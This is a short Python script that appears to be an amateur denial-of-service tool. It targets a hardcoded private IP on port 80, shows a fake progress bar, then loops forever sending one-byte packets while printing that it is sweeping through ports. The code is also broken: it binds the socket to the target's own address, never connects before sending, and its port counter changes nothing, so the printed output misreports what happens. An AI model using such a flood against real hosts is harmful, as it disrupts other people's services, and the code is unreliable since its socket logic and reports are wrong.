# import datetime
from datetime import datetime
import os
from random import randint
import socket
import sys
import time


def get_current_date_time() -> str:
    now: datetime = datetime.now()
    return now.strftime("%d/%m/%Y %H:%M:%S")

# ip = input("IP Target : ")
# port = input("Port: ")

ip = '192.168.42.130'
try:
     port = int('80')
except ValueError:
     print('Invalid value')
     sys.exit(1)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip, port))
# sock.listen(1)

for i in range(5):
     print('[', end='')
     for j in range(i*4):
          print('=', end='')
     for k in range(16-i*4):
          print(' ', end='')
     print(f'] {i * 25}%')
     time.sleep(1)

sent: int = 0
print('Started at ', get_current_date_time())
while True:
     # bytes_to_send: str = str(randint(1, 1490))
     sock.send(b'1')
     sent += 1
     port += 1
     print(f"Sent {sent} packet to {ip} throught port:{port}")
     if port == 65534:
       port = 1
print('Finished at ', get_current_date_time())
